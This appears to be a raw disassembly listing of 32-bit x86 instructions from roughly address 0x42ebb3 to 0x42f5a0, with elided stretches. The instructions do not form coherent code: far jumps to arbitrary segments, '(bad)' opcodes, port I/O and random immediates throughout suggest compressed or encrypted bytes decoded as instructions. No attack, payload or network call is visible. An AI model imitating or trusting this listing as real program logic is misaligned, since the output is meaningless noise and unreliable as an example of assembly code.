  42ebb3:	adc    DWORD PTR [esi+0x11a4297b],edi
  42ebb9:	fadd   QWORD PTR [ecx-0x2b]
  42ebbc:	xor    eax,0x7cc92eea
  42ebc1:	cmp    ch,BYTE PTR [ebx+0x7fe63376]
  42ebc7:	sbb    DWORD PTR [eax-0x6a598740],ecx
  42ebcd:	mov    WORD PTR [edi+0x2a],ss
  42ebd0:	jno    0x42ebc7
  42ebd2:	ret    0xcf1e
  42ebd5:	sbb    BYTE PTR [edx+0x72],bl
  42ebd8:	xchg   edi,eax
  42ebd9:	sub    DWORD PTR [edx-0x48],ebp
  42ebdc:	outs   dx,BYTE PTR ds:[esi]
  42ebdd:	jno    0x42ebe7
  42ebdf:	pop    es
  42ebe0:	or     eax,0x24f9702
  42ebe5:	push   edi
  42ebe6:	cmp    BYTE PTR [eax-0x5c7104bf],0xf2
  42ebed:	inc    esi
  42ebee:	mov    eax,ds:0x1154cfe6
  42ebf3:	bound  esp,QWORD PTR [edx+ebp*4-0x7f]
  42ebf7:	xchg   DWORD PTR [ebp+0x24],esp
  42ebfa:	fwait
  42ebfb:	push   ss
  42ebfc:	mov    al,0xfa
  42ebfe:	adc    DWORD PTR [edi-0x85bec6c],eax
  42ec04:	test   al,0x88
  42ec06:	ffreep st(0)
  42ec09:	jl     0x42ebbe
  42ec0b:	adc    DWORD PTR [edx-0x5cf67174],ecx
  42ec11:	pop    es
  42ec12:	cmp    DWORD PTR [esi-0x2e6366bc],esi
  42ec18:	imul   eax,DWORD PTR [esi+eiz*1-0x27ffdc5],0x8ff4f336
  42ec23:	adc    al,0x1e
  42ec25:	jmp    0x6ba8:0x3d44661d
  42ec2c:	mov    DWORD PTR [esi-0x6e],0xc259ae4c
  42ec33:	fstp   DWORD PTR [eax+0x3f929622]
  42ec39:	test   eax,0x89469cbe
  42ec3e:	test   ebp,edi
  42ec40:	fldcw  WORD PTR [ebp+edx*8+0x67b9efd5]
  42ec47:	mul    BYTE PTR [edi]
  42ec49:	pushf  
  42ec4a:	push   eax
  42ec4b:	nop
  42ec4c:	jo     0x42ec5d
  42ec4e:	mov    edi,0xa5f77a2a
  42ec53:	shr    BYTE PTR [edx],cl
  42ec55:	outs   dx,DWORD PTR ds:[esi]
  42ec56:	scas   al,BYTE PTR es:[edi]
  42ec57:	pop    edx
  42ec58:	pop    ebx
  42ec59:	or     ebx,esp
  42ec5b:	xchg   ebx,eax
  42ec5c:	push   esi
  42ec5d:	and    eax,0x9f555ae
  42ec62:	xor    al,0xc7
  42ec64:	jmp    0xd8d:0xe9ff7855
  42ec6b:	dec    ebx
  42ec6c:	call   0x739509f1
  42ec71:	(bad)  
  42ec72:	fisubr WORD PTR ds:0xa230358f
  42ec78:	pop    esi
  42ec79:	addr16 popa 
  42ec7b:	cmc    
  42ec7c:	fs push ss
  42ec7e:	std    
  42ec7f:	cwde   
  42ec80:	add    al,al
  42ec82:	aad    0x30
  42ec84:	jb     0x42ecdb
  42ec86:	loope  0x42ec13
  42ec88:	and    al,0x72
  42ec8a:	push   0x38
  42ec8c:	lods   al,BYTE PTR ds:[esi]
  42ec8d:	push   edi
  42ec8e:	mov    ecx,0x58f3a161
  42ec93:	nop
  42ec94:	and    DWORD PTR [esi+0x4114d195],ecx
  42ec9a:	dec    esi
  42ec9b:	mov    edi,0xfeee8bce
  42eca0:	cmp    esp,DWORD PTR [esi+0x71f9f0cf]
  42eca6:	ret    
  42eca7:	xchg   DWORD PTR [eax+0x79a3c655],esi
  42ecad:	or     DWORD PTR [edi+0x191a7a69],esp
  42ecb3:	push   ebx
  42ecb4:	scas   eax,DWORD PTR es:[edi]
	...
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi-0x220f5e81]
  42ed23:	push   ebx
  42ed24:	in     al,dx
  42ed25:	adc    eax,0x1f5c6
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [eax+0x26],bh
  42ed30:	test   eax,0xcdcd97a
  42ed36:	mov    al,0xbc
  42ed38:	(bad)  
  42ed39:	loop   0x42ed77
  42ed3b:	mov    al,ds:0x2c5b7c27
  42ed40:	fistp  QWORD PTR [esi+0x4f8d4941]
  42ed46:	inc    edi
  42ed47:	mov    bl,0xa8
  42ed49:	call   0xf42c:0x873fc003
  42ed50:	xor    DWORD PTR [ecx-0x8812063],eax
  42ed56:	loop   0x42ed56
  42ed58:	cmp    DWORD PTR [ecx-0x5],0x191907b1
  42ed5f:	sub    dl,BYTE PTR [ecx+0x4daaa76f]
  42ed65:	pop    eax
  42ed66:	jmp    0x732e:0x996f2eea
  42ed6d:	sbb    DWORD PTR [ebx],ebx
  42ed6f:	scas   eax,DWORD PTR es:[edi]
  42ed70:	dec    ebx
  42ed71:	sub    BYTE PTR [esi],dh
  42ed73:	int3   
  42ed74:	pop    es
  42ed75:	test   BYTE PTR [ebp-0x79f8a7e6],dl
  42ed7b:	push   esi
  42ed7c:	inc    ebx
  42ed7d:	pop    ss
  42ed7e:	mov    DWORD PTR [esi+edx*1+0x4ef5311f],ecx
  42ed85:	out    dx,eax
  42ed86:	and    ecx,0x9068befa
  42ed8c:	sub    DWORD PTR ds:0xd1362a9,esp
  42ed92:	pop    eax
  42ed93:	ins    DWORD PTR es:[edi],dx
  42ed94:	jge    0x42edff
  42ed96:	sbb    ebx,edi
  42ed98:	or     eax,0x74186536
  42ed9d:	and    dl,dl
  42ed9f:	hlt    
  42eda0:	popa   
  42eda1:	shr    DWORD PTR [eax-0x4945b914],1
  42eda7:	cdq    
  42eda8:	or     ecx,DWORD PTR [edx]
  42edaa:	mov    al,0x3
  42edac:	enter  0xdd20,0x81
  42edb0:	addr16 push esi
  42edb2:	xchg   ebp,eax
  42edb3:	sub    eax,0xf5ad481f
  42edb8:	push   ds
  42edb9:	pop    esp
  42edba:	cmp    BYTE PTR [ecx+eax*4],ch
  42edbd:	fs mov ebx,edi
  42edc0:	dec    esi
  42edc1:	mov    eax,0xf64a9316
  42edc6:	cmp    DWORD PTR [edx+ebx*2+0x32abbac6],esi
  42edcd:	rcl    BYTE PTR [eax+esi*1-0x7fe2d7ef],cl
  42edd4:	aam    0xa2
  42edd6:	xor    BYTE PTR [ebx-0x8],0x4e
  42edda:	out    dx,eax
  42eddb:	jmp    0x42ee39
  42eddd:	pop    edx
  42edde:	(bad)  
  42eddf:	xchg   esp,eax
  42ede0:	call   0x51bf7815
  42ede5:	add    dl,BYTE PTR [edx-0xc]
  42ede8:	inc    esi
  42ede9:	xor    eax,0x2de84692
  42edee:	xor    DWORD PTR [eax],ebp
  42edf0:	shl    esi,cl
  42edf2:	int    0x10
  42edf4:	or     al,0x66
  42edf6:	inc    eax
  42edf7:	cmp    eax,0x9efcad7f
  42edfc:	icebp  
  42edfd:	jp     0x42ede0
  42edff:	jno    0x42ee7b
  42ee01:	mov    ds:0x75d824a0,al
  42ee06:	je     0x42edcb
  42ee08:	jb     0x42ee40
  42ee0a:	arpl   bx,cx
  42ee0c:	fcom   QWORD PTR ds:0x516e854c
  42ee12:	add    esp,DWORD PTR [ebx+esi*4-0x12]
  42ee16:	mov    DWORD PTR [eax],esp
  42ee18:	ret    0x3221
  42ee1b:	push   ss
  42ee1c:	icebp  
  42ee1d:	fwait
  42ee1e:	mov    al,ds:0x5e986538
  42ee23:	inc    edx
  42ee24:	mov    edi,0xba1afcde
  42ee29:	dec    esp
  42ee2a:	sahf   
  42ee2b:	sti    
  42ee2c:	(bad)  
  42ee2d:	and    esi,ebx
  42ee2f:	rcl    BYTE PTR [ebx+0x11],1
  42ee32:	or     al,0x33
  42ee34:	repnz add BYTE PTR [eax],al
	...
  42ee93:	add    BYTE PTR [eax],al
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0x38eff479,edi
  42eea4:	sbb    BYTE PTR [ebx],ah
  42eea6:	int    0xf6
  42eea8:	add    DWORD PTR [eax],eax
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    ch,dh
  42eeaf:	sbb    ah,BYTE PTR [eax+0x1d]
  42eeb2:	push   ecx
  42eeb3:	mov    ebx,0xaadfbe43
  42eeb8:	mov    esp,0x3b3c0ab2
  42eebd:	stos   BYTE PTR es:[edi],al
  42eebe:	push   ss
  42eebf:	pop    ebp
  42eec0:	cmp    ecx,DWORD PTR [esi-0xdbce790]
  42eec6:	pop    ecx
  42eec7:	fcom   DWORD PTR [ebx+eiz*1+0x298bc157]
  42eece:	adc    ecx,DWORD PTR [esi]
  42eed0:	out    dx,al
  42eed1:	mov    ebx,0x6412f382
  42eed6:	adc    DWORD PTR [ebx+0x117ab853],esp
  42eedc:	fisttp QWORD PTR [eax]
  42eede:	out    dx,al
  42eedf:	add    DWORD PTR [ebx+0x24cc034f],ebx
  42eee5:	fimul  WORD PTR [esi-0x11ba3af9]
  42eeeb:	xor    al,0x22
  42eeed:	cli    
  42eeee:	cmp    edx,DWORD PTR [esi-0x747b7b62]
  42eef4:	jl     0x42eeb8
  42eef6:	add    ecx,esp
  42eef8:	mov    dl,0x4d
  42eefa:	ss dec esp
  42eefc:	sub    DWORD PTR [ecx+eiz*2],0xffffff9a
  42ef00:	push   0xc14b903d
  42ef05:	shl    BYTE PTR [ebp+0x47],1
  42ef08:	jne    0x42eef0
  42ef0a:	push   ss
  42ef0b:	dec    esp
  42ef0c:	pop    eax
  42ef0d:	mov    DWORD PTR [edi-0x11e24c1f],edi
  42ef13:	sub    eax,0xa3bdfa0
  42ef18:	jle    0x42ef6d
  42ef1a:	mov    ds:0x71a36592,eax
  42ef1f:	push   ecx
  42ef20:	cmp    BYTE PTR [ecx],0x6a
  42ef23:	pop    edx
  42ef24:	std    
  42ef25:	loopne 0x42efa1
  42ef27:	mov    ch,0xa
  42ef29:	stos   BYTE PTR es:[edi],al
  42ef2a:	jmp    0x342f801e
  42ef2f:	and    ecx,esp
  42ef31:	sti    
  42ef32:	sbb    bl,dh
  42ef34:	dec    esp
  42ef35:	test   DWORD PTR [edx+eax*1],0xd993df3a
  42ef3c:	sub    dh,BYTE PTR [esi+0x5fc2676d]
  42ef42:	push   0x632ec6d6
  42ef47:	mov    eax,ds:0xae4ea6bb
  42ef4c:	cdq    
  42ef4d:	pop    eax
  42ef4e:	xchg   ebp,eax
  42ef4f:	cmp    BYTE PTR [ebx-0x3c],0x93
  42ef53:	in     eax,0xa8
  42ef55:	cld    
  42ef56:	rol    BYTE PTR [ebp-0x583fbd1e],1
  42ef5c:	in     eax,0x72
  42ef5e:	adc    bh,BYTE PTR [edi]
  42ef60:	fisub  DWORD PTR [edx+0x5f]
  42ef63:	dec    esp
  42ef64:	push   edx
  42ef65:	loop   0x42ef0e
  42ef67:	or     DWORD PTR [ebx],0x28
  42ef6a:	rol    BYTE PTR [edx],cl
  42ef6c:	and    al,0xbb
  42ef6e:	ret    
  42ef6f:	sub    eax,0x27c07f20
  42ef74:	add    DWORD PTR [eax+esi*8-0x750bfd8e],0xe87fcd02
  42ef7f:	test   al,0x7b
  42ef81:	or     DWORD PTR [ebp+0x23],ebp
  42ef84:	dec    eax
  42ef85:	sar    DWORD PTR [ebp-0x48e50273],0xbb
  42ef8c:	leave  
  42ef8d:	lock rol BYTE PTR [edi+ebx*4-0x5c654449],0x42
  42ef96:	loopne 0x42ef96
  42ef98:	test   al,0x50
  42ef9a:	fcomp  DWORD PTR [ebp-0x34]
  42ef9d:	lea    eax,[edx]
  42ef9f:	(bad)  
  42efa0:	or     eax,0x550fc320
  42efa5:	out    0x99,eax
  42efa7:	jmp    0x98d523fe
  42efac:	ret    0x1b20
  42efaf:	push   ecx
  42efb0:	sbb    ebx,DWORD PTR [eax+ebx*1+0xfb9a]
	...
  42f013:	add    BYTE PTR [eax],al
  42f015:	add    BYTE PTR [edx],dl
  42f017:	ds int 0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0x93ecd516
  42f024:	(bad)  
  42f025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f026:	aam    0xf7
  42f028:	add    DWORD PTR [eax],eax
  42f02a:	pop    es
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    BYTE PTR [ebp-0x7caf503f],ch
  42f033:	leave  
  42f034:	(bad)  
  42f035:	pusha  
  42f036:	jecxz  0x42efca
  42f038:	or     DWORD PTR ds:0x36ecc87e,ebp
  42f03e:	and    DWORD PTR [ebx-0x22b5b84d],esi
  42f044:	mov    bl,0x2b
  42f046:	sub    ah,bh
  42f048:	mov    ch,0xa7
  42f04a:	xor    dh,BYTE PTR [esi-0x1]
  42f04d:	shr    BYTE PTR [ebx],0x2a
  42f050:	xor    BYTE PTR [edx-0x12a93a0b],ch
  42f056:	mov    esi,0x88b256ff
  42f05b:	push   0x59
  42f05d:	aaa    
  42f05e:	test   eax,0x1fdf1a74
  42f063:	xchg   ebp,eax
  42f064:	mov    ds:0xea925010,al
  42f069:	fstp   QWORD PTR [eax]
  42f06b:	xchg   edx,eax
  42f06c:	sbb    dh,cl
  42f06e:	or     al,0xd8
  42f070:	push   eax
  42f071:	enter  0x423e,0xce
  42f075:	pop    edi
  42f076:	jp     0x42f03b
  42f078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f079:	int    0xd9
  42f07b:	xchg   edx,eax
  42f07c:	test   al,0xa5
  42f07e:	aas    
  42f07f:	scas   al,BYTE PTR es:[edi]
  42f080:	test   ebx,0x38734f60
  42f086:	mov    ds:0x92735298,eax
  42f08b:	or     esp,edi
  42f08d:	push   esi
  42f08e:	mov    dh,0x2f
  42f090:	add    edi,DWORD PTR [ecx-0x6f]
  42f093:	xchg   esi,eax
  42f094:	dec    edx
  42f095:	cdq    
  42f096:	ins    DWORD PTR es:[edi],dx
  42f097:	leave  
  42f098:	dec    ch
  42f09a:	sub    WORD PTR [ecx+0x2b],0x2310
  42f0a0:	mov    ds:0xcce10484,al
  42f0a5:	bound  ecx,QWORD PTR [esi+0x16]
  42f0a8:	xchg   BYTE PTR [edx+ebp*2+0x7e4e5427],ah
  42f0af:	fmul   DWORD PTR [esi+0x42d781c8]
  42f0b5:	add    ah,BYTE PTR [esi-0x7c]
  42f0b8:	jb     0x42f04c
  42f0ba:	mov    BYTE PTR [esi-0x42971be7],bh
  42f0c0:	xor    ah,bh
  42f0c2:	cli    
  42f0c3:	(bad)  
  42f0c4:	ror    DWORD PTR [ecx+0x30],1
  42f0c7:	xor    ah,BYTE PTR [esi]
  42f0c9:	js     0x42f067
  42f0cb:	add    BYTE PTR [eax],0x2
  42f0ce:	retf   
  42f0cf:	ror    bh,cl
  42f0d1:	outs   dx,DWORD PTR ds:[esi]
  42f0d2:	leave  
  42f0d3:	xor    ah,ch
  42f0d5:	jp     0x42f09d
  42f0d7:	adc    DWORD PTR [ecx+0x466b13cf],esp
  42f0dd:	xchg   DWORD PTR [ecx+0x5514f40d],esi
  42f0e3:	test   BYTE PTR [eax+0x1b],0xdb
  42f0e7:	bound  esi,QWORD PTR [edi+0x5cfb5074]
  42f0ed:	push   ss
  42f0ee:	fisubr WORD PTR [ecx]
  42f0f0:	cdq    
  42f0f1:	mov    ds:0x7beae981,al
  42f0f6:	cmp    eax,0x480bfe48
  42f0fb:	jns    0x42f08e
  42f0fd:	(bad)  
  42f0fe:	cmc    
  42f0ff:	xchg   esi,eax
  42f100:	sbb    BYTE PTR [edi],0x72
  42f103:	pop    esi
  42f104:	push   ss
  42f105:	mov    edx,0x8ba0242a
  42f10a:	mov    dh,BYTE PTR [edx]
  42f10c:	arpl   WORD PTR [eax],di
  42f10e:	bound  ebp,QWORD PTR [edi]
  42f110:	out    dx,al
  42f111:	hlt    
  42f112:	lahf   
  42f113:	mov    DWORD PTR [esi-0x2867d43d],ebp
  42f119:	dec    ecx
  42f11a:	lahf   
  42f11b:	add    eax,0xc7415cba
  42f120:	in     eax,dx
  42f121:	cmp    al,0x1b
  42f123:	enter  0xb02b,0xdf
  42f127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f128:	add    BYTE PTR [ebp-0x25],ah
  42f12b:	loope  0x42f0e8
  42f12d:	sbb    BYTE PTR [edi],cl
  42f12f:	stos   DWORD PTR es:[edi],eax
  42f130:	es pusha 
  42f132:	sbb    dh,BYTE PTR [esi+0x56]
	...
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f20a
  42f1a3:	xor    BYTE PTR [edi+0x1f8db77],dl
  42f1a9:	add    BYTE PTR [edi],al
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    BYTE PTR [ecx],ah
  42f1af:	adc    ecx,DWORD PTR [ebx+0x3469a014]
  42f1b5:	or     DWORD PTR [edx-0x3a],esp
  42f1b8:	mov    bl,0xbe
  42f1ba:	add    al,0x59
  42f1bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1bd:	aad    0x15
  42f1bf:	jbe    0x42f20a
  42f1c1:	or     al,0xa8
  42f1c3:	mov    ch,0xcf
  42f1c5:	push   eax
  42f1c6:	push   0xffffffa3
  42f1c8:	mov    ecx,esp
  42f1ca:	inc    ebx
  42f1cb:	pop    ebp
  42f1cc:	(bad)  
  42f1cd:	in     al,0x63
  42f1cf:	and    DWORD PTR ds:0xb27b9090,esi
  42f1d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1d6:	lds    edx,FWORD PTR [ecx+0x4c]
  42f1d9:	pop    es
  42f1da:	popa   
  42f1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1dc:	or     eax,esi
  42f1de:	cdq    
  42f1df:	xchg   ecx,eax
  42f1e0:	cmc    
  42f1e1:	in     al,0xff
  42f1e3:	pop    eax
  42f1e4:	retf   0x9ee5
  42f1e7:	push   ebp
  42f1e8:	adc    BYTE PTR [ebp+0x78daff50],0x27
  42f1ef:	mov    esi,esp
  42f1f1:	shl    BYTE PTR [ebx+0x4a],0x97
  42f1f5:	stc    
  42f1f6:	cdq    
  42f1f7:	icebp  
  42f1f8:	push   ds
  42f1f9:	jbe    0x42f1ec
  42f1fb:	fldcw  WORD PTR [ecx]
  42f1fd:	sbb    bh,BYTE PTR [ebx+0x569c0c2e]
  42f203:	ss pop edx
  42f205:	call   0x451e:0x9eaa16ec
  42f20c:	jns    0x42f20e
  42f20e:	sub    BYTE PTR [edi+0x3782e62d],ah
  42f214:	cmp    edx,esp
  42f216:	xor    BYTE PTR [ecx-0x1],0xae
  42f21a:	ja     0x42f220
  42f21c:	add    ebp,DWORD PTR [ebx+0x22]
  42f21f:	fmulp  st(2),st
  42f221:	loop   0x42f26d
  42f223:	hlt    
  42f224:	iret   
  42f225:	cmp    eax,0x3cf44c55
  42f22a:	xlat   BYTE PTR ds:[ebx]
  42f22b:	or     BYTE PTR [edx+0x1d],ah
  42f22e:	in     al,0x4d
  42f230:	(bad)  
  42f231:	call   0x98fe:0x4b0413b1
  42f238:	dec    esi
  42f239:	fld    QWORD PTR [ecx-0x5b8ebee8]
  42f23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f240:	adc    DWORD PTR [ebx+0x42004d30],0x9780052
  42f24a:	and    al,dl
  42f24c:	sub    ebx,DWORD PTR [esi-0x48]
  42f24f:	enter  0x52eb,0x28
  42f253:	rol    DWORD PTR [edx+0x591a1dfe],cl
  42f259:	rcr    BYTE PTR [edx+edi*8],cl
  42f25c:	jge    0x42f231
  42f25e:	push   ebp
  42f25f:	js     0x42f1e5
  42f261:	jp     0x42f25c
  42f263:	jg     0x42f241
  42f265:	xor    BYTE PTR [ecx+ecx*4-0x2a],0xff
  42f26a:	dec    ebp
  42f26b:	outs   dx,BYTE PTR ds:[esi]
  42f26c:	data16 in al,0x66
  42f26f:	bound  ebp,QWORD PTR [edx]
  42f271:	pop    edx
  42f272:	repnz test eax,0x890bb596
  42f278:	dec    ebx
  42f279:	adc    eax,0x411db55e
  42f27e:	sbb    esp,DWORD PTR [edi]
  42f280:	sbb    al,0x93
  42f282:	and    eax,0xf20e1cd
  42f287:	xor    eax,0x7be8d4d9
  42f28c:	lock jae 0x42f220
  42f28f:	pop    ds
  42f290:	mov    esi,0x153ac4fa
  42f295:	sahf   
  42f296:	fidivr DWORD PTR [ebx+0x637fa68]
  42f29c:	mov    bh,0xa6
  42f29e:	pop    ss
  42f29f:	mov    ch,0x77
  42f2a1:	shr    DWORD PTR [edi+0x2c],cl
  42f2a4:	inc    eax
  42f2a5:	sahf   
  42f2a6:	(bad)  
  42f2a8:	mov    dh,0x3a
  42f2aa:	adc    bl,bl
  42f2ac:	mov    esi,0x19a0875
  42f2b1:	sti    
  42f2b2:	pop    es
  42f2b3:	dec    esp
  42f2b4:	push   ecx
	...
  42f315:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	out    0x15,al
  42f324:	mov    dl,0xd8
  42f326:	loop   0x42f321
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    BYTE PTR [eax+0x55],dl
  42f330:	xor    al,0xca
  42f332:	ds addr16 jmp 0xc322083e
  42f339:	iret   
  42f33a:	imul   ecx,edx,0x5
  42f33d:	retf   
  42f33e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f33f:	shl    DWORD PTR [eax],0x14
  42f342:	mov    bh,BYTE PTR [edi]
  42f344:	inc    eax
  42f345:	retf   
  42f346:	retf   
  42f347:	xchg   esp,eax
  42f348:	(bad)  
  42f349:	fidivr WORD PTR [edi+0x16e7f24d]
  42f34f:	ins    BYTE PTR es:[edi],dx
  42f350:	mov    bh,0xd5
  42f352:	fdivr  QWORD PTR [esi-0xc]
  42f355:	cdq    
  42f356:	jle    0x42f322
  42f358:	imul   edx,DWORD PTR [ebx+edi*2-0x41272b64],0x4922ba9a
  42f363:	mov    ebp,0x531d283b
  42f368:	mov    WORD PTR [esi],?
  42f36a:	and    BYTE PTR [ebx],0xea
  42f36d:	cmp    BYTE PTR [edi-0x38e7a294],cl
  42f373:	neg    DWORD PTR [ecx+esi*8+0x47]
  42f377:	call   0x8d58d3cf
  42f37c:	push   esp
  42f37d:	xchg   ebx,eax
  42f37e:	lahf   
  42f37f:	mov    ebp,0x917c9a16
  42f384:	scas   eax,DWORD PTR es:[edi]
  42f385:	jns    0x42f3d7
  42f387:	test   DWORD PTR [esi-0x23],ebp
  42f38a:	xchg   ebx,eax
  42f38b:	push   ebx
  42f38c:	jl     0x42f3ce
  42f38e:	ins    BYTE PTR es:[edi],dx
  42f38f:	ins    DWORD PTR es:[edi],dx
  42f390:	adc    DWORD PTR [esi],edi
  42f392:	jmp    0xd3ac:0x9ec55456
  42f399:	outs   dx,DWORD PTR ds:[esi]
  42f39a:	sbb    al,0xb3
  42f39c:	retf   
  42f39d:	add    BYTE PTR [ebx+0x3fd50313],cl
  42f3a3:	pushf  
  42f3a4:	stos   DWORD PTR es:[edi],eax
  42f3a5:	push   0xf
  42f3a7:	cld    
  42f3a8:	(bad)
  42f3ac:	fdivr  DWORD PTR [eax+0x16318e1b]
  42f3b2:	xor    BYTE PTR [edx-0x46],bl
  42f3b5:	inc    edi
  42f3b6:	and    DWORD PTR [edx+ecx*2+0x4012957f],edx
  42f3bd:	(bad)
  42f3c0:	inc    eax
  42f3c1:	shl    DWORD PTR [esp+eax*1+0x69],0xc6
  42f3c6:	dec    esp
  42f3c7:	or     eax,esp
  42f3c9:	sub    eax,0x4d9a45b7
  42f3ce:	adc    al,0x42
  42f3d0:	mov    ecx,DWORD PTR [ebp-0x3b]
  42f3d3:	ret    0x226d
  42f3d6:	imul   DWORD PTR [ebx]
  42f3d8:	sbb    eax,0xd28b8a2a
  42f3dd:	pop    esi
  42f3de:	cmp    al,0x7a
  42f3e0:	retf   
  42f3e1:	shl    BYTE PTR [edx],cl
  42f3e3:	or     al,BYTE PTR [ecx+ebx*4]
  42f3e6:	jge    0x42f42f
  42f3e8:	mov    edi,0x47ecc438
  42f3ed:	add    BYTE PTR [edi-0x7d902d50],bh
  42f3f3:	loope  0x42f3ca
  42f3f5:	jmp    0x42f459
  42f3f7:	pop    ebx
  42f3f8:	out    dx,eax
  42f3f9:	rcl    BYTE PTR [edx-0x230c5920],0xcb
  42f400:	jns    0x42f3d0
  42f402:	cmc    
  42f403:	dec    edx
  42f404:	out    0xa1,al
  42f406:	xchg   ebx,eax
  42f407:	push   di
  42f409:	mov    dl,0x63
  42f40b:	in     eax,0x2d
  42f40d:	jbe    0x42f417
  42f40f:	jne    0x42f405
  42f411:	in     al,0xc9
  42f413:	add    esp,DWORD PTR [edx+0x48849f41]
  42f419:	mov    BYTE PTR [esi+0x6a59c561],ah
  42f41f:	xor    eax,0x8e715403
  42f424:	push   ebp
  42f425:	cmp    DWORD PTR [edi+0x26],ecx
  42f428:	jmp    0x82552da6
  42f42d:	dec    ecx
  42f42e:	xor    DWORD PTR [ecx],esi
  42f430:	add    BYTE PTR [edi+0x73752a],0x0
	...
  42f493:	add    BYTE PTR [eax],al
  42f495:	add    BYTE PTR [edi],dh
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	or     eax,0xe907191c
  42f4a7:	cli    
  42f4a8:	add    DWORD PTR [eax],eax
  42f4aa:	pop    es
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [ecx],al
  42f4af:	cs ds gs repnz mov esi,0xff200ec9
  42f4b8:	in     eax,dx
  42f4b9:	fcomp  QWORD PTR [edx]
  42f4bb:	fstp   QWORD PTR [ebp+eax*1+0x621d79f9]
  42f4c2:	pop    ss
  42f4c3:	add    al,0xd6
  42f4c5:	add    DWORD PTR [edi+0x33],ebx
  42f4c8:	nop
  42f4c9:	lds    esp,FWORD PTR [edx]
  42f4cb:	gs test al,0xf0
  42f4ce:	push   0xffffff96
  42f4d0:	and    edi,DWORD PTR [edx]
  42f4d2:	xor    eax,0xcbf5d940
  42f4d7:	push   esp
  42f4d8:	xchg   esp,eax
  42f4d9:	push   eax
  42f4da:	push   esp
  42f4db:	fild   QWORD PTR [edi]
  42f4dd:	mov    ah,0xad
  42f4df:	imul   ecx,DWORD PTR ss:[ebx+0x77],0xfffffff0
  42f4e4:	ret    0xfacf
  42f4e7:	lods   eax,DWORD PTR ds:[esi]
  42f4e8:	daa    
  42f4e9:	mov    al,ds:0x8fef273f
  42f4ee:	fidivr DWORD PTR [esi]
  42f4f0:	fs sahf 
  42f4f2:	xchg   esp,eax
  42f4f3:	out    0xfd,eax
  42f4f5:	clc    
  42f4f6:	lods   al,BYTE PTR ds:[esi]
  42f4f7:	mov    ds:0xb35c96a1,eax
  42f4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4fd:	mov    ebp,0x51e784d0
  42f502:	out    0xbf,al
  42f504:	shl    esp,cl
  42f506:	in     eax,dx
  42f507:	pusha  
  42f508:	stos   DWORD PTR es:[edi],eax
  42f509:	dec    esi
  42f50a:	xchg   ebp,eax
  42f50b:	test   DWORD PTR [eax-0x603978ea],edi
  42f511:	repnz xor al,0xee
  42f514:	sub    bh,BYTE PTR [ecx]
  42f516:	iret   
  42f517:	sbb    eax,0x6b1a2f70
  42f51c:	fcomp  QWORD PTR [eax+0x4bf535e0]
  42f522:	xchg   edx,eax
  42f523:	cmp    al,0xe1
  42f525:	std    
  42f526:	test   BYTE PTR [edi-0x6d],ch
  42f529:	dec    ecx
  42f52a:	ret    
  42f52b:	cmp    DWORD PTR [eax+esi*8+0x7e],eax
  42f52f:	mov    dl,0xb3
  42f531:	pop    eax
  42f532:	dec    ebx
  42f533:	js     0x42f4c6
  42f535:	sbb    DWORD PTR [ebx],edx
  42f537:	jmp    0x7520a842
  42f53c:	mov    esi,0xaf55d383
  42f541:	jecxz  0x42f4e8
  42f543:	aaa    
  42f544:	mov    dh,0x40
  42f546:	xlat   BYTE PTR ds:[ebx]
  42f547:	test   al,0x57
  42f549:	jle    0x42f4d2
  42f54b:	mov    esp,0x2ba964c3
  42f550:	js     0x42f5a9
  42f552:	sbb    eax,0xd4e10c1c
  42f557:	jne    0x42f51b
  42f559:	fidiv  WORD PTR ds:0x54d1b823
  42f55f:	gs or  eax,0x7d23939b
  42f565:	mov    es,esi
  42f567:	mov    ?,WORD PTR [edx]
  42f569:	ds pop ebx
  42f56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f56c:	mov    esp,0xe0e108a0
  42f571:	xchg   esp,eax
  42f572:	mov    eax,0x5e0d34bb
  42f577:	mov    eax,0x602eb7c0
  42f57c:	bound  ebp,QWORD PTR es:[edi-0x7ef4f04]
  42f583:	rcr    BYTE PTR [ebx+eax*8-0x6f],0x9c
  42f588:	mov    cl,0x1e
  42f58a:	mov    edi,ebx
  42f58c:	loopne 0x42f5e7
  42f58e:	imul   esp,DWORD PTR [edi],0x971ff108
  42f594:	mov    ebx,0x51d97d15
  42f599:	xchg   esp,eax
  42f59a:	daa    
  42f59b:	pop    ss
  42f59c:	and    al,0xd8
  42f59e:	loopne 0x42f57b
  42f5a0:	sub    DWORD PTR [ecx+ebp*1-0x7cbac905],eax
